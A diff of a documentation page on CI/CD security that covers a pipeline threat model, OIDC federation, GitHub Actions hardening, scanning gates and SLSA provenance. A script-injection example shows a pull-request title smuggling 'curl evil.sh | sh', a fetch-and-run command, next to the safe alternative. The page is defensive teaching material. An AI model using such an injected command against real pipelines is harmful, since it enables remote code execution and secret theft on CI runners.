@@ -4,19 +4,19 @@
   <meta charset="utf-8">
 
 <!-- SEO Meta Tags -->
-<meta name="description" content="Technology and Physics notes">
+<meta name="description" content="Pipeline threat model, secrets and OIDC federation, hardening GitHub Actions, SLSA provenance, Sigstore signing and SBOMs, GitOps, IaC pipelines, DORA metric...">
 <meta name="author" content="Andrew">
 
 <!-- Open Graph -->
 <meta property="og:title" content="CI/CD: Security, GitOps & Operations">
-<meta property="og:description" content="Technology and Physics notes">
+<meta property="og:description" content="Pipeline threat model, secrets and OIDC federation, hardening GitHub Actions, SLSA provenance, Sigstore signing and SBOMs, GitOps, IaC pipelines, DORA metric...">
 <meta property="og:type" content="website">
 <meta property="og:url" content="https://andrewaltimit.github.io/Documentation/docs/technology/ci-cd/security-and-operations.html">
 
 <!-- Twitter Card -->
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CI/CD: Security, GitOps & Operations">
-<meta name="twitter:description" content="Technology and Physics notes">
+<meta name="twitter:description" content="Pipeline threat model, secrets and OIDC federation, hardening GitHub Actions, SLSA provenance, Sigstore signing and SBOMs, GitOps, IaC pipelines, DORA metric...">
 
 <title>CI/CD: Security, GitOps & Operations | Andrews Notebook</title>
 
@@ -2875,845 +2875,690 @@ document.addEventListener('DOMContentLoaded', function () {
       <section id="page-content" class="page__content">
         <p><a href="./">CI/CD</a> ›</p>
 
-<p>Securing pipelines, GitOps and Infrastructure as Code, observability, and the advanced topics that keep delivery reliable at scale.</p>
+<h1 id="security-gitops--operations">Security, GitOps &amp; Operations</h1>
 
-<h2 id="security-in-cicd">Security in CI/CD</h2>
+<p>A CI/CD system holds production credentials, runs third-party code on every build, and publishes artifacts that everything downstream trusts, which makes it one of the most valuable targets in an organization. This page covers securing that system (secrets, OIDC federation, GitHub Actions hardening, and supply-chain provenance with SLSA, Sigstore, and SBOMs), running deployments through GitOps and infrastructure-as-code pipelines, measuring delivery with the DORA metrics, and operating runners and pipelines at scale.</p>
 
-<h3 id="secrets-management">Secrets Management</h3>
+<h2 id="pipeline-threat-model">Pipeline Threat Model</h2>
 
-<p><strong>Bad Practice</strong>:</p>
-<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">deploy</span><span class="pi">:</span>
+<p>Attacks on delivery pipelines usually do not target the running application. They target the path that produces it:</p>
+
+<pre><code class="language-mermaid">flowchart LR
+    SRC["Source repo"] --&gt; CI["CI runner"]
+    DEP["Dependencies&lt;br/&gt;&amp; base images"] --&gt; CI
+    ACT["Third-party&lt;br/&gt;actions / plugins"] --&gt; CI
+    CI --&gt; REG[("Artifact&lt;br/&gt;registry")]
+    REG --&gt; CD["Deploy / GitOps"]
+    CD --&gt; PROD["Production"]
+    A1(["Malicious PR,&lt;br/&gt;script injection"]) -.-&gt; SRC
+    A2(["Typosquat, compromised&lt;br/&gt;maintainer, xz-style backdoor"]) -.-&gt; DEP
+    A3(["Retagged or&lt;br/&gt;compromised action"]) -.-&gt; ACT
+    A4(["Secret exfiltration,&lt;br/&gt;cache poisoning"]) -.-&gt; CI
+    A5(["Artifact swap,&lt;br/&gt;mutable tags"]) -.-&gt; REG
+</code></pre>
+
+<p>Recent incidents show each edge being used:</p>
+
+<ul>
+  <li>
+<strong>xz-utils (2024)</strong>: a multi-year social-engineering campaign gave an attacker maintainer access, and a backdoor was hidden in release tarballs and build scripts rather than in the reviewed source.</li>
+  <li>
+<strong>Ultralytics (December 2024)</strong>: a GitHub Actions workflow triggered on <code class="language-plaintext highlighter-rouge">pull_request_target</code> was abused through injection and cache poisoning to publish PyPI releases containing a cryptominer.</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">tj-actions/changed-files</code> (March 2025, CVE-2025-30066)</strong>: the tags of a popular action were repointed to a malicious commit that dumped runner memory, secrets included, into build logs of thousands of repositories. Workflows pinned to a commit SHA were unaffected.</li>
+  <li>
+<strong>Shai-Hulud (September 2025)</strong>: a self-propagating npm worm stole publishing tokens from developer machines and CI, then used them to publish trojaned versions of the victims’ other packages.</li>
+</ul>
+
+<p>The common thread is <strong>implicit trust in things that can change</strong>: tags, tokens, and caches. The rest of this section is about replacing that trust with verification.</p>
+
+<h2 id="secrets-management">Secrets Management</h2>
+
+<p>Secrets never go in the repository or in pipeline definitions. Store them in the platform’s secret store or an external manager, and scope them as narrowly as possible:</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># GitHub Actions: secrets scoped to a protected environment</span>
+<span class="na">jobs</span><span class="pi">:</span>
+  <span class="na">deploy</span><span class="pi">:</span>
+    <span class="na">runs-on</span><span class="pi">:</span> <span class="s">ubuntu-latest</span>
+    <span class="na">environment</span><span class="pi">:</span> <span class="s">production</span>          <span class="c1"># secrets below exist only in this environment,</span>
+                                     <span class="c1"># which can require reviewers and restrict branches</span>
+    <span class="na">steps</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="na">run</span><span class="pi">:</span> <span class="s">./deploy.sh</span>
+        <span class="na">env</span><span class="pi">:</span>
+          <span class="na">API_KEY</span><span class="pi">:</span> <span class="s">${{ secrets.PAYMENTS_API_KEY }}</span>   <span class="c1"># masked in logs</span>
+</code></pre></div></div>
+
+<p>In GitLab, mark CI/CD variables as <strong>protected</strong> (exposed only to protected branches and tags) and <strong>masked</strong> (redacted from job logs). Rules that apply on any platform:</p>
+
+<ul>
+  <li>
+<strong>Scope secrets to environments and branches.</strong> A PR from a feature branch should never be able to read production secrets.</li>
+  <li>
+<strong>Never pass secrets on the command line.</strong> Arguments show up in process listings and in traced logs. Use environment variables or files.</li>
+  <li>
+<strong>Masking is best-effort.</strong> Transformed secrets (base64-encoded, split, or printed a character at a time) are not recognized. Do not rely on log masking as a control.</li>
+  <li>
+<strong>Prefer no secret at all.</strong> Most cloud and registry credentials can be replaced by OIDC federation.</li>
+</ul>
+
+<h3 id="oidc-federation-no-stored-cloud-keys">OIDC Federation: No Stored Cloud Keys</h3>
+
+<p>Modern CI platforms can issue each job a short-lived, signed <strong>OIDC token</strong> describing <em>which</em> repository, branch, workflow, and environment is running. A cloud provider configured to trust the CI platform’s issuer checks those claims and exchanges the token for temporary credentials. There is nothing long-lived to store, rotate, or leak.</p>
+
+<pre><code class="language-mermaid">sequenceDiagram
+    participant J as CI job
+    participant P as CI OIDC issuer
+    participant C as Cloud STS / Vault
+    participant R as Cloud resources
+    J-&gt;&gt;P: request ID token (audience = cloud)
+    P--&gt;&gt;J: signed JWT (repo, ref, environment, workflow)
+    J-&gt;&gt;C: exchange JWT for credentials
+    C-&gt;&gt;C: verify signature + trust-policy conditions&lt;br/&gt;(e.g. repo:org/app:environment:production)
+    C--&gt;&gt;J: temporary credentials (~1h)
+    J-&gt;&gt;R: deploy
+</code></pre>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># GitHub Actions -&gt; AWS, no stored access keys</span>
+<span class="na">jobs</span><span class="pi">:</span>
+  <span class="na">deploy</span><span class="pi">:</span>
+    <span class="na">runs-on</span><span class="pi">:</span> <span class="s">ubuntu-latest</span>
+    <span class="na">environment</span><span class="pi">:</span> <span class="s">production</span>
+    <span class="na">permissions</span><span class="pi">:</span>
+      <span class="na">id-token</span><span class="pi">:</span> <span class="s">write</span>     <span class="c1"># allow this job to request an OIDC token</span>
+      <span class="na">contents</span><span class="pi">:</span> <span class="s">read</span>
+    <span class="na">steps</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="na">uses</span><span class="pi">:</span> <span class="s">aws-actions/configure-aws-credentials@v6</span>
+        <span class="na">with</span><span class="pi">:</span>
+          <span class="na">role-to-assume</span><span class="pi">:</span> <span class="s">arn:aws:iam::123456789012:role/deploy-web</span>
+          <span class="na">aws-region</span><span class="pi">:</span> <span class="s">us-east-1</span>
+      <span class="pi">-</span> <span class="na">run</span><span class="pi">:</span> <span class="s">aws ecs update-service --cluster prod --service web --force-new-deployment</span>
+</code></pre></div></div>
+
+<p>The security of this scheme depends entirely on the <strong>trust policy’s conditions</strong>. A role that trusts any token from <code class="language-plaintext highlighter-rouge">token.actions.githubusercontent.com</code> with a broad <code class="language-plaintext highlighter-rouge">sub</code> wildcard can be assumed by any repository on GitHub. Always pin <code class="language-plaintext highlighter-rouge">sub</code> to the specific repository and, for production roles, the specific environment or branch.</p>
+
+<p>GitLab provides the same mechanism through <code class="language-plaintext highlighter-rouge">id_tokens:</code>. It replaces the deprecated <code class="language-plaintext highlighter-rouge">CI_JOB_JWT</code> variables:</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># GitLab -&gt; HashiCorp Vault: short-lived dynamic DB credentials</span>
+<span class="na">migrate</span><span class="pi">:</span>
+  <span class="na">id_tokens</span><span class="pi">:</span>
+    <span class="na">VAULT_ID_TOKEN</span><span class="pi">:</span>
+      <span class="na">aud</span><span class="pi">:</span> <span class="s">https://vault.example.com</span>
   <span class="na">script</span><span class="pi">:</span>
-    <span class="pi">-</span> <span class="s">API_KEY="sk-1234567890" npm run deploy</span>  <span class="c1"># Never do this!</span>
+    <span class="pi">-</span> <span class="s">export VAULT_TOKEN=$(vault write -field=token auth/jwt/login role=ci-migrate jwt="$VAULT_ID_TOKEN")</span>
+    <span class="pi">-</span> <span class="s">creds=$(vault read -format=json database/creds/app-migrate)</span>   <span class="c1"># per-job DB user, TTL-bound</span>
+    <span class="pi">-</span> <span class="s">export DB_USER=$(echo "$creds" | jq -r .data.username)</span>
+    <span class="pi">-</span> <span class="s">export DB_PASS=$(echo "$creds" | jq -r .data.password)</span>
+    <span class="pi">-</span> <span class="s">./run-migrations.sh</span>
 </code></pre></div></div>
 
-<p><strong>Good Practice</strong>:</p>
-<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">deploy</span><span class="pi">:</span>
+<h3 id="secret-maturity-ladder">Secret Maturity Ladder</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Level</th>
+      <th>Practice</th>
+      <th>Residual risk</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>1</td>
+      <td>Static secrets in the CI secret store, rotated manually on a schedule</td>
+      <td>A leaked value is valid until someone notices and rotates it</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>Secrets manager (Vault, AWS Secrets Manager, GCP Secret Manager) rotates automatically</td>
+      <td>Standing credentials still exist between rotations</td>
+    </tr>
+    <tr>
+      <td>3</td>
+      <td>
+<strong>Dynamic secrets</strong> minted per job with a short TTL (e.g. Vault database engine)</td>
+      <td>Exposure limited to minutes</td>
+    </tr>
+    <tr>
+      <td>4</td>
+      <td>
+<strong>Workload identity / OIDC federation</strong>: no secret material at all</td>
+      <td>Misconfigured trust policies</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>When a static secret must remain, rotate it without downtime by overlapping validity: issue the new credential, deploy consumers that accept both, then revoke the old one. Package registries have moved the same way. <strong>Trusted publishing</strong> on PyPI and npm lets CI publish packages with an OIDC identity instead of a stored API token, which directly closes the token-theft route that worms such as Shai-Hulud relied on.</p>
+
+<h2 id="hardening-github-actions">Hardening GitHub Actions</h2>
+
+<p>GitHub Actions is the most widely used CI platform and has its own class of vulnerabilities. The main controls:</p>
+
+<p><strong>Pin third-party actions to a full commit SHA.</strong> Tags such as <code class="language-plaintext highlighter-rouge">@v4</code> are mutable, and the <code class="language-plaintext highlighter-rouge">tj-actions</code> attacker simply moved them. A SHA cannot be moved. Keep the tag in a comment so Dependabot or Renovate can propose updates:</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="pi">-</span> <span class="na">uses</span><span class="pi">:</span> <span class="s">actions/checkout@0123456789abcdef0123456789abcdef01234567</span> <span class="c1"># v6.0.2  (illustrative SHA)</span>
+</code></pre></div></div>
+
+<p>Organization and enterprise administrators can now <strong>enforce</strong> SHA pinning through the allowed-actions policy, so workflows that use unpinned actions fail. The same policy can <strong>block</strong> specific actions (prefix <code class="language-plaintext highlighter-rouge">!</code>), which gives a fast response when an action is compromised.</p>
+
+<p><strong>Default the <code class="language-plaintext highlighter-rouge">GITHUB_TOKEN</code> to read-only.</strong> Set <code class="language-plaintext highlighter-rouge">permissions: contents: read</code> at the workflow level, or as the organization default, and grant write scopes per job only where needed.</p>
+
+<p><strong>Treat <code class="language-plaintext highlighter-rouge">pull_request_target</code> and <code class="language-plaintext highlighter-rouge">workflow_run</code> as privileged.</strong> They run in the context of the <em>base</em> repository, with secrets and a write token, but are often used to process <em>untrusted</em> fork content. Never check out and execute a fork’s code in these workflows. Recent major versions of <code class="language-plaintext highlighter-rouge">actions/checkout</code> refuse to check out fork PR code under these triggers unless explicitly overridden.</p>
+
+<p><strong>Avoid script injection.</strong> Expressions are substituted into the script text <em>before</em> the shell runs, so attacker-controlled fields (PR titles, branch names, issue bodies) become code:</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Vulnerable: a PR titled  x"; curl evil.sh | sh; echo "  executes</span>
+<span class="pi">-</span> <span class="na">run</span><span class="pi">:</span> <span class="s">echo "Title</span><span class="err">:</span> <span class="s">${{ github.event.pull_request.title }}"</span>
+
+<span class="c1"># Safe: pass through an environment variable; the shell treats it as data</span>
+<span class="pi">-</span> <span class="na">run</span><span class="pi">:</span> <span class="s">echo "Title</span><span class="err">:</span> <span class="s">$TITLE"</span>
+  <span class="na">env</span><span class="pi">:</span>
+    <span class="na">TITLE</span><span class="pi">:</span> <span class="s">${{ github.event.pull_request.title }}</span>
+</code></pre></div></div>
+
+<p><strong>Do not share caches across trust boundaries.</strong> A cache written by an untrusted workflow and restored by a release workflow is a code-injection path; that was the Ultralytics vector. Release jobs should build from a clean state or use caches keyed so that only trusted refs write them.</p>
+
+<p><strong>Lint workflows automatically.</strong> <strong>zizmor</strong> and <strong>poutine</strong> statically detect injection, excessive permissions, unpinned actions, and dangerous triggers. Runtime tools such as StepSecurity’s <strong>harden-runner</strong> restrict and audit network egress from hosted runners.</p>
+
+<h2 id="scanning-gates">Scanning Gates</h2>
+
+<p>Scanners answer the question “is anything in here already known to be bad?” They should run as <strong>blocking gates</strong> with explicit thresholds rather than as advisory reports nobody reads.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Scan</th>
+      <th>Finds</th>
+      <th>Common tools</th>
+      <th>Where it runs</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Secret scanning</strong></td>
+      <td>Committed keys and tokens, including in history</td>
+      <td>gitleaks, TruffleHog, GitHub push protection</td>
+      <td>Pre-commit hook, push protection, CI</td>
+    </tr>
+    <tr>
+      <td>
+<strong>SCA</strong> (software composition analysis)</td>
+      <td>Known-vulnerable dependencies from lockfiles</td>
+      <td>OSV-Scanner, Dependabot, Renovate, Snyk, <code class="language-plaintext highlighter-rouge">npm audit</code>, <code class="language-plaintext highlighter-rouge">pip-audit</code>
+</td>
+      <td>Every PR; continuous re-scan</td>
+    </tr>
+    <tr>
+      <td><strong>SAST</strong></td>
+      <td>Vulnerable patterns in your own code</td>
+      <td>Semgrep, CodeQL, SonarQube, Bandit</td>
+      <td>Every PR</td>
+    </tr>
+    <tr>
+      <td><strong>Container / OS packages</strong></td>
+      <td>CVEs in base-image packages</td>
+      <td>Trivy, Grype, Docker Scout</td>
+      <td>After image build; registry re-scan</td>
+    </tr>
+    <tr>
+      <td><strong>IaC / config</strong></td>
+      <td>Misconfigured Terraform, Kubernetes, Dockerfiles</td>
+      <td>Trivy (<code class="language-plaintext highlighter-rouge">config</code>), Checkov, KICS</td>
+      <td>Every PR touching infra</td>
+    </tr>
+    <tr>
+      <td><strong>License policy</strong></td>
+      <td>Forbidden licenses pulled in transitively</td>
+      <td>Trivy (<code class="language-plaintext highlighter-rouge">license</code>), ORT, FOSSA</td>
+      <td>Release pipeline</td>
+    </tr>
+    <tr>
+      <td><strong>DAST</strong></td>
+      <td>Runtime vulnerabilities in a deployed app</td>
+      <td>OWASP ZAP, Nuclei</td>
+      <td>Against staging</td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># GitLab: parallel security gates that fail the pipeline on findings</span>
+<span class="na">secrets</span><span class="pi">:</span>
+  <span class="na">stage</span><span class="pi">:</span> <span class="s">test</span>
   <span class="na">script</span><span class="pi">:</span>
-    <span class="pi">-</span> <span class="s">npm run deploy</span>
-  <span class="na">environment</span><span class="pi">:</span>
-    <span class="na">name</span><span class="pi">:</span> <span class="s">production</span>
-  <span class="na">secrets</span><span class="pi">:</span>
-    <span class="na">API_KEY</span><span class="pi">:</span>
-      <span class="na">from_secret</span><span class="pi">:</span> <span class="s">api_key_production</span>
+    <span class="pi">-</span> <span class="s">gitleaks git --redact --exit-code 1 .</span>        <span class="c1"># full history, not just the working tree</span>
+
+<span class="na">dependencies</span><span class="pi">:</span>
+  <span class="na">stage</span><span class="pi">:</span> <span class="s">test</span>
+  <span class="na">script</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="s">osv-scanner scan source --recursive .</span>
+
+<span class="na">image-vulns</span><span class="pi">:</span>
+  <span class="na">stage</span><span class="pi">:</span> <span class="s">test</span>
+  <span class="na">needs</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">build-image</span><span class="pi">]</span>
+  <span class="na">script</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="s">trivy image --severity HIGH,CRITICAL --ignore-unfixed --exit-code 1 "$IMAGE@$DIGEST"</span>
 </code></pre></div></div>
 
-<h3 id="security-scanning-pipeline">Security Scanning Pipeline</h3>
+<p>Scanning at build time is necessary but reactive: an image that scanned clean yesterday can match a CVE disclosed today. Keep <strong>SBOMs</strong> for everything shipped and re-scan them continuously (below), and turn on registry-side scanning. See <a href="../docker/registry.html#vulnerability-scanning">Docker Registry &amp; Distribution</a>.</p>
 
-<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">security-scan</span><span class="pi">:</span>
-  <span class="na">stage</span><span class="pi">:</span> <span class="s">security</span>
-  <span class="na">parallel</span><span class="pi">:</span>
-    <span class="pi">-</span> <span class="na">dependency-check</span><span class="pi">:</span>
-        <span class="na">script</span><span class="pi">:</span>
-          <span class="pi">-</span> <span class="s">npm audit</span>
-          <span class="pi">-</span> <span class="s">pip-audit</span>  <span class="c1"># Python (alternative to safety)</span>
-          <span class="pi">-</span> <span class="s">bundle audit</span>  <span class="c1"># Ruby</span>
-          <span class="pi">-</span> <span class="s">osv-scanner --recursive .</span>  <span class="c1"># Google's OSV Scanner</span>
+<h2 id="supply-chain-provenance">Supply-Chain Provenance</h2>
 
-    <span class="pi">-</span> <span class="na">sast</span><span class="pi">:</span>  <span class="c1"># Static Application Security Testing</span>
-        <span class="na">script</span><span class="pi">:</span>
-          <span class="pi">-</span> <span class="s">semgrep --config=auto</span>
-          <span class="pi">-</span> <span class="s">bandit -r src/</span>  <span class="c1"># Python</span>
-          <span class="pi">-</span> <span class="s">snyk code test</span>
+<p>Scanning detects <em>known-bad</em> components. Provenance proves <em>where an artifact came from</em>: which source commit, which builder, which inputs. Together with signatures and SBOMs, it forms a chain of evidence that a deployment gate can verify:</p>
 
-    <span class="pi">-</span> <span class="na">container-scan</span><span class="pi">:</span>
-        <span class="na">script</span><span class="pi">:</span>
-          <span class="pi">-</span> <span class="s">trivy image myapp:latest</span>
-          <span class="pi">-</span> <span class="s">grype myapp:latest</span>  <span class="c1"># Anchore scanner</span>
-          <span class="pi">-</span> <span class="s">docker scout cves myapp:latest</span>  <span class="c1"># Docker's native scanner</span>
+<pre><code class="language-mermaid">flowchart LR
+    S["Source commit"] --&gt; B["Hardened build&lt;br/&gt;(hosted, isolated)"]
+    B --&gt; A["Artifact&lt;br/&gt;image@sha256:..."]
+    B --&gt; PV["Provenance attestation&lt;br/&gt;(SLSA: who / how / from what)"]
+    A --&gt; SG["Signature&lt;br/&gt;(Sigstore, keyless)"]
+    A --&gt; SB["SBOM attestation&lt;br/&gt;(SPDX / CycloneDX)"]
+    PV --&gt; V{"Admission gate&lt;br/&gt;verify all three"}
+    SG --&gt; V
+    SB --&gt; V
+    V --&gt;|"pass"| D["Deploy"]
+    V --&gt;|"fail"| X["Reject"]
+</code></pre>
 
-    <span class="pi">-</span> <span class="na">secrets-scan</span><span class="pi">:</span>
-        <span class="na">script</span><span class="pi">:</span>
-          <span class="pi">-</span> <span class="s">gitleaks detect --source=.</span>
-          <span class="pi">-</span> <span class="s">trufflehog filesystem . --json</span>
-</code></pre></div></div>
+<h3 id="slsa">SLSA</h3>
 
-<h3 id="security-best-practices">Security Best Practices</h3>
-
-<ol>
-  <li>
-<strong>Rotate Secrets Regularly</strong>
-```yaml
-    <ul>
-      <li>name: Check secret age
-run: |
-  if [ $(secret_age $SECRET_NAME) -gt 90 ]; then
-    echo “::error::Secret older than 90 days!”
-    exit 1
-  fi
-```</li>
-    </ul>
-  </li>
-  <li>
-<strong>Least Privilege Access</strong>
-    <div class="language-yaml highlighter-rouge">
-<div class="highlight"><pre class="highlight"><code><span class="na">deploy</span><span class="pi">:</span>
-  <span class="na">permissions</span><span class="pi">:</span>
-    <span class="na">contents</span><span class="pi">:</span> <span class="s">read</span>
-    <span class="na">deployments</span><span class="pi">:</span> <span class="s">write</span>
-    <span class="c1"># Only what's needed, nothing more</span>
-</code></pre></div>    </div>
-  </li>
-  <li>
-<strong>Audit Logs</strong>
-```yaml
-after_script:
-    <ul>
-      <li>echo “Deployed by $CI_USER at $CI_TIMESTAMP” » audit.log
-```</li>
-    </ul>
-  </li>
-</ol>
-
-<h2 id="software-supply-chain-security">Software Supply-Chain Security</h2>
-
-<p>The classic threat model assumes attackers come through the front door — the running application. Supply-chain attacks come through the <em>build</em>: a compromised dependency (SolarWinds, <code class="language-plaintext highlighter-rouge">event-stream</code>, the <code class="language-plaintext highlighter-rouge">xz</code> backdoor), a poisoned base image, a stolen signing key, or a tampered build step that injects malware into an otherwise-legitimate artifact. Because the resulting binary is signed and shipped through normal channels, downstream consumers trust it implicitly. Supply-chain security closes this gap by making the <strong>provenance</strong> of every artifact verifiable: <em>what</em> source produced it, <em>which</em> builder ran, and <em>what</em> it depends on — all cryptographically attested and checked before deployment.</p>
-
-<p>The pieces fit together as a chain of evidence:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>source ──build──▶ artifact ──sign──▶ signature
-   │                  │                   │
-   └─ dependency      └─ SBOM             └─ provenance attestation
-      scanning           (bill of            (SLSA: who/how/from-what)
-                          materials)
-                              │
-                       admission/verify gate ──▶ deploy
-</code></pre></div></div>
-
-<h3 id="slsa-levels-of-build-integrity">SLSA: Levels of Build Integrity</h3>
-
-<p><strong>SLSA</strong> (Supply-chain Levels for Software Artifacts, pronounced “salsa”) is a framework that grades how trustworthy an artifact’s build process is. It is <em>not</em> a tool — it is a set of requirements you satisfy by hardening your pipeline. The current v1.0 track focuses on <strong>build provenance</strong>:</p>
+<p><strong>SLSA</strong> (Supply-chain Levels for Software Artifacts, “salsa”) is an OpenSSF specification that grades how trustworthy an artifact’s build is. It is a set of requirements, not a tool. The current version is <strong>SLSA v1.2</strong>, which keeps the <strong>Build track</strong> from v1.0 and adds a <strong>Source track</strong> covering the integrity of source-control history and review. The Build track levels:</p>
 
 <table>
   <thead>
     <tr>
       <th>Level</th>
       <th>Requirement</th>
-      <th>What it stops</th>
+      <th>Defends against</th>
     </tr>
   </thead>
   <tbody>
     <tr>
-      <td><strong>L0</strong></td>
-      <td>No guarantees</td>
+      <td><strong>Build L0</strong></td>
       <td>Nothing</td>
+      <td>—</td>
     </tr>
     <tr>
-      <td><strong>L1</strong></td>
-      <td>Provenance exists — build emits a signed record of how the artifact was produced</td>
-      <td>Mistakes; “where did this binary come from?”</td>
+      <td><strong>Build L1</strong></td>
+      <td>Provenance exists, describing how the artifact was built</td>
+      <td>Mistakes; unknown origin of artifacts</td>
     </tr>
     <tr>
-      <td><strong>L2</strong></td>
-      <td>Provenance is <strong>signed</strong> by a hosted build platform; source and build are version-controlled</td>
-      <td>Tampering with provenance after the fact</td>
+      <td><strong>Build L2</strong></td>
+      <td>Provenance is generated and <strong>signed by a hosted build platform</strong>
+</td>
+      <td>Tampering with the artifact or provenance after the build</td>
     </tr>
     <tr>
-      <td><strong>L3</strong></td>
-      <td>Build runs on a <strong>hardened, isolated</strong> platform; provenance is <strong>non-forgeable</strong> (signed by the platform, not the build script)</td>
-      <td>A malicious build step forging its own provenance; cross-build contamination</td>
+      <td><strong>Build L3</strong></td>
+      <td>The build platform is <strong>hardened</strong>: runs are isolated from each other, and signing material is inaccessible to user-defined build steps</td>
+      <td>A compromised build step forging provenance; cross-build contamination</td>
     </tr>
   </tbody>
 </table>
 
-<p>The key idea at L3 is <strong>isolation</strong>: the build environment cannot reach the signing key, so even a fully compromised build <em>script</em> cannot forge a valid provenance attestation. GitHub-hosted runners with the <code class="language-plaintext highlighter-rouge">slsa-framework/slsa-github-generator</code> reusable workflow reach L3 because the signing happens in a separate, trusted reusable workflow your job cannot tamper with.</p>
+<p>The key idea at L3 is that even a fully malicious build <em>script</em> cannot produce a valid provenance statement, because the signing happens somewhere the script cannot reach.</p>
 
-<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># SLSA L3 provenance via the official GitHub generator</span>
+<p>On GitHub there are two common routes:</p>
+
+<ul>
+  <li>
+<strong>Artifact attestations</strong> (<code class="language-plaintext highlighter-rouge">actions/attest</code>, which <code class="language-plaintext highlighter-rouge">actions/attest-build-provenance</code> now wraps): signed SLSA provenance stored by GitHub and verifiable with <code class="language-plaintext highlighter-rouge">gh attestation verify</code>. On its own this meets Build L2. Running the build in a <strong>reusable workflow</strong> that callers cannot modify isolates the signing and reaches L3. Available for public repositories on all plans and for private repositories on GitHub Enterprise Cloud.</li>
+  <li>
+<strong><code class="language-plaintext highlighter-rouge">slsa-framework/slsa-github-generator</code></strong> (currently v2.1.0): the OpenSSF reusable workflows that produce L3 provenance for generic artifacts, containers, and several language ecosystems.</li>
+</ul>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Build, push, and attest a container image (GitHub artifact attestations)</span>
 <span class="na">jobs</span><span class="pi">:</span>
-  <span class="na">build</span><span class="pi">:</span>
-    <span class="na">outputs</span><span class="pi">:</span>
-      <span class="na">digest</span><span class="pi">:</span> <span class="s">${{ steps.hash.outputs.digest }}</span>
+  <span class="na">image</span><span class="pi">:</span>
     <span class="na">runs-on</span><span class="pi">:</span> <span class="s">ubuntu-latest</span>
-    <span class="na">steps</span><span class="pi">:</span>
-      <span class="pi">-</span> <span class="na">uses</span><span class="pi">:</span> <span class="s">actions/checkout@v4</span>
-      <span class="pi">-</span> <span class="na">run</span><span class="pi">:</span> <span class="s">make release</span>   <span class="c1"># produces ./dist/app</span>
-      <span class="pi">-</span> <span class="na">id</span><span class="pi">:</span> <span class="s">hash</span>
-        <span class="na">run</span><span class="pi">:</span> <span class="s">echo "digest=$(sha256sum dist/app | base64 -w0)" &gt;&gt; "$GITHUB_OUTPUT"</span>
-
-  <span class="na">provenance</span><span class="pi">:</span>
-    <span class="na">needs</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">build</span><span class="pi">]</span>
     <span class="na">permissions</span><span class="pi">:</span>
-      <span class="na">actions</span><span class="pi">:</span> <span class="s">read</span>       <span class="c1"># read the workflow run</span>
-      <span class="na">id-token</span><span class="pi">:</span> <span class="s">write</span>     <span class="c1"># OIDC token for keyless signing</span>
-      <span class="na">contents</span><span class="pi">:</span> <span class="s">write</span>     <span class="c1"># attach provenance to the release</span>
-    <span class="c1"># The reusable workflow runs isolated from your build job — this is what</span>
-    <span class="c1"># makes the provenance non-forgeable and earns L3.</span>
-    <span class="na">uses</span><span class="pi">:</span> <span class="s">slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v2.0.0</span>
-    <span class="na">with</span><span class="pi">:</span>
-      <span class="na">base64-subjects</span><span class="pi">:</span> <span class="s">${{ needs.build.outputs.digest }}</span>
+      <span class="na">contents</span><span class="pi">:</span> <span class="s">read</span>
+      <span class="na">packages</span><span class="pi">:</span> <span class="s">write</span>
+      <span class="na">id-token</span><span class="pi">:</span> <span class="s">write</span>          <span class="c1"># Sigstore certificate via OIDC</span>
+      <span class="na">attestations</span><span class="pi">:</span> <span class="s">write</span>
+      <span class="na">artifact-metadata</span><span class="pi">:</span> <span class="s">write</span>
+    <span class="na">steps</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="na">uses</span><span class="pi">:</span> <span class="s">actions/checkout@v6</span>
+      <span class="pi">-</span> <span class="na">id</span><span class="pi">:</span> <span class="s">push</span>
+        <span class="na">uses</span><span class="pi">:</span> <span class="s">docker/build-push-action@v6</span>
+        <span class="na">with</span><span class="pi">:</span>
+          <span class="na">push</span><span class="pi">:</span> <span class="kc">true</span>
+          <span class="na">tags</span><span class="pi">:</span> <span class="s">ghcr.io/${{ github.repository }}:${{ github.sha }}</span>
+      <span class="pi">-</span> <span class="na">uses</span><span class="pi">:</span> <span class="s">actions/attest@v4</span>
+        <span class="na">with</span><span class="pi">:</span>
+          <span class="na">subject-name</span><span class="pi">:</span> <span class="s">ghcr.io/${{ github.repository }}</span>
+          <span class="na">subject-digest</span><span class="pi">:</span> <span class="s">${{ steps.push.outputs.digest }}</span>
+          <span class="na">push-to-registry</span><span class="pi">:</span> <span class="kc">true</span>
 </code></pre></div></div>
 
-<h3 id="artifact-signing-with-cosign-and-sigstore">Artifact Signing with Cosign and Sigstore</h3>
